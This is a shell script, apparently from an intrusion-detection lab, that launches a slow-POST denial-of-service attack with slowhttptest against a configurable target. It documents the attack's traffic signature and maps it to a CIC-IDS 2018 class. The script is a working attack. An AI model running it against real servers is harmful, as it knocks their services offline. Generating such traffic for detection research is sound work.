#!/bin/sh
# slow_body.sh — Slow POST body DoS (R-U-Dead-Yet) via slowhttptest.
#
# Sends POST requests where the body is dribbled a few bytes per tick,
# keeping nginx worker connections tied up for the full duration.
#
# OIF signature: flow_duration_s long (>60s), fwd_act_data_pkts > 0
# (POST body chunks being sent — unlike Slowloris where fwd_act_data_pkts=0),
# pkt_len_mean very small (2-10 bytes per chunk), bwd_pkts_per_sec near zero
# (server waiting for complete body before responding).
#
# Maps to CIC-IDS 2018 class DoS-SlowHTTPTest (class 7).
TARGET=${1:-http://172.20.0.10/}
CONNS=${2:-200}
DURATION=${3:-120}

echo "[attack] Slow POST body -> $TARGET  $CONNS connections  ${DURATION}s"

# -B: slow body mode (POST body dribbled byte-by-byte)
# -c: concurrent connections
# -l: test duration in seconds
# -i: interval between body data chunks (seconds)
# -s: Content-Length declared in the POST header
# -r: connection rate per second
slowhttptest -B -c "$CONNS" -l "$DURATION" -i 10 -s 8192 -r 50 -u "$TARGET"